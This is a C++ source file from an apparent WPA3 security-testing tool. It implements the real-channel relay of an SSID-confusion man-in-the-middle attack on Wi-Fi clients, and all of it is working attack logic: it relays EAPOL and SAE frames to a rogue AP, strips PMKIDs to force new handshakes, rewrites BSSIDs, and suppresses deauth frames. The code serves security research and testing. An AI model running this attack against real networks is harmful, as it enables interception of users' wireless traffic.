#include "attacks/mc_mitm/mc_mitm.h"
#include "attacks/mc_mitm/ssid_confusion/ssid_helper.h"
#include "attacks/mc_mitm/wifi_util.h"
#include "logger/error_log.h"
#include "net_parser/dot11_defs.h"
#include "net_parser/eap_defs.h"
#include "net_parser/kde_defs.h"
#include "net_parser/radiotap_defs.h"
#include "system/hw_capabilities.h"

namespace wpa3_tester::ssid_confusion {
using namespace Tins;
using namespace std;
using namespace std::chrono;


void SsidConfusion::send_to_rogue(PDU &pdu) const {
	const frame_raw_t raw = pdu.serialize();
	send_to_rogue(raw);
}

void SsidConfusion::send_to_rogue(const frame_raw_t &raw) const {
	const auto full_radiotap = ensure_radiotap(raw);
	sock_rogue->send(full_radiotap, netconfig.rogue_channel);
}

FrameProcess SsidConfusion::handle_eapol_real(
	const HWAddress<6> addr2, const PDU &pdu,
	const frame_raw_t &raw) const {
	// EAPOL AP -> STA on real channel
	if(addr2 == ap.get(SK::mac) && is_eapol(pdu)) {
		if(client_state.get_state() < ClientState::Associated) return STOP;
		//TODO check first M1as PMKSA cache hit -> force EAP restart
		const auto msg = get_eapol_msg_num(raw);
		if(msg == EapolMsg::Msg2 || msg == EapolMsg::Msg4) return STOP; //block cycles
		if(msg == EapolMsg::Msg1) {
			frame_raw_t stripped = raw;
			if(strip_pmkid_in_assoc) {
				strip_pmkid_kde(stripped); //don't allow PMKSA - only in new connection
				display_traffic(pdu, "Real channel", " [EAPOL 1/4, PMKID stripped] -- MitM'ing");
			}else {
				display_traffic(pdu, "Real channel", " [EAPOL 1/4] -- MitM'ing");
			}
			send_to_rogue(stripped);
			return STOP;
		}
		// allow other processing for EAP frames (not EAPOL-Key)
		if(msg == EapolMsg::Msg3) return CONTINUE;
		display_traffic(pdu, "Real channel", " AP -> STA  -- MitM'ing ");
		send_to_rogue(raw);
		return STOP;
	}
	return CONTINUE;
}

FrameProcess SsidConfusion::handle_probe_real(const HWAddress<6> addr2, const Dot11 &dot11) {
	if(dot11.find_pdu<Dot11ProbeRequest>() || dot11.find_pdu<Dot11ProbeResponse>()){
		// only if not associated, to not disconnect of background scanning
		if(addr2 == sta.get(SK::mac) && client_state.get_state() < ClientState::Associated){
			display_traffic(dot11, "Real channel", " -- send CSA");
			client_state.update_state(ClientState::Sent_to_rogue);
		}
		return STOP;
	}
	return CONTINUE;
}

FrameProcess SsidConfusion::handle_mgmt_action_real(const HWAddress<6> addr1, const Dot11 &dot11, const frame_raw_t &raw) const {
	//Don't know what exactly - for example SA Query Request from real AP -> relay to STA on rogue (transparent, MIC stays valid)
	if(dot11.type() == dot11::TYPE_MGMT && dot11.subtype() == dot11::MGMT_ACTION && addr1 == rogue_sta.get(SK::mac)) {
		display_traffic(dot11, "Real channel", " MGMT_ACTION -- relay to rogue");
		send_to_rogue(raw);
		return STOP;
	}
	return CONTINUE;
}


FrameProcess SsidConfusion::handle_assoc_real(
	const HWAddress<6> addr1, const PDU &pdu,
	const frame_raw_t &raw) const {
	auto *dot11 = pdu.find_pdu<Dot11>();
	// relay real AP assoc response back to STA (rewrite BSSID so STA accepts it)
	if(dot11->find_pdu<Dot11AssocResponse>() || dot11->find_pdu<Dot11ReAssocResponse>()) {
		if(addr1 == rogue_sta.get(SK::mac) && client_state.get_state() >= ClientState::Associated) {
			log(LogLevel::DEBUG, "AssocResp: addr1={} rogue_sta={} state={}", addr1, rogue_sta.get(SK::mac), ClientState::state2str(client_state.get_state()));
			display_traffic(*dot11, "Real channel", " assoc resp -- relay to rogue");
			auto relayed = ensure_radiotap(raw);
			patch_ht_operation_in_frame(relayed, netconfig.rogue_channel.ch_num);
			rewrite_bssid_in_frame(relayed, rogue_ap.get(SK::mac));
			send_to_rogue(relayed);
		}
		return STOP;
	}
	return CONTINUE;
}

void SsidConfusion::handle_rx_real_chan(const std::unique_ptr<PDU> &pdu, const frame_raw_t &raw) {
	auto *dot11 = pdu->find_pdu<Dot11>();
	if(!dot11) return;
	//filter out different channels
	if(const auto *rt = pdu->find_pdu<RadioTap>()) {
		if(rt->present() & RadioTap::CHANNEL &&
			rt->channel_freq() != hw_capabilities::channel_to_freq(netconfig.real_channel))
			return;
	}
	const auto [addr1, addr2] = get_addrs(*pdu, raw);
	if(addr2 == HWAddress<6>() && dot11->type() != Dot11::CONTROL){
		log(LogLevel::DEBUG, "Real channel: Unknown frame type");
		return;
	}
	power_mgmt_response_real(addr2, *dot11);

	// ignore useless
	if(dot11->type() == dot11::TYPE_CTRL && dot11->subtype()) return;
	if(dot11->find_pdu<Dot11Beacon>()) return; // don't relay real AP beacons
	if(dot11->find_pdu<Dot11Authentication>()) {
		if(addr1 == rogue_sta.get(SK::mac)) {
			// relay AP auth response back to client (SAE commit/confirm, or Open seq=2)
			auto relayed = ensure_radiotap(raw);
			const size_t rt_len = radiotap::get_rt_len(relayed);
			if(relayed.size() >= rt_len + dot11::ADDR1_END)
				ranges::copy(HWAddress<6>(sta.get(SK::mac)), relayed.begin() + static_cast<ptrdiff_t>(rt_len + dot11::ADDR1_OFFSET));
			rewrite_bssid_in_frame(relayed, rogue_ap.get(SK::mac));
			send_to_rogue(relayed);
			display_traffic(*dot11, "Real channel", "-- Auth relay to client");
		}
		return;
	}
	// don't relay deauth/disassoc from real AP - would disconnect client from rogue AP
	if(dot11->find_pdu<Dot11Deauthentication>() || dot11->find_pdu<Dot11Disassoc>()) {
		//TODO should be changes status here or neds be ignored because first deauth
		handle_disconnect_real(*dot11);
		return;
	}

	#define SOLVE_OR_CONTINUE(handle_fun) if(handle_fun) return;

	SOLVE_OR_CONTINUE(handle_probe_real(addr2, *dot11))
	SOLVE_OR_CONTINUE(handle_eapol_real(addr2, *pdu, raw))
	//TODO assoc ok for relaying? - test this is not issue for some clients
	SOLVE_OR_CONTINUE(handle_assoc_real(addr1, *pdu, raw))
	SOLVE_OR_CONTINUE(handle_mgmt_action_real(addr1, *dot11, raw))
	#undef SOLVE_OR_CONTINUE

	if((addr1 == rogue_sta.get(SK::mac) || addr2 == ap.get(SK::mac)) && client_state.get_state() >= ClientState::Associated) {
		// libtins truncates SNAP/EAPOL frames -> handle_eapol_real misses msg1; strip here as fallback
		auto to_send = raw;
		strip_pmkid_kde(to_send);
		display_traffic(*pdu, "Real channel", " -- MitM'ing");
		send_to_rogue(to_send);
	}
}

}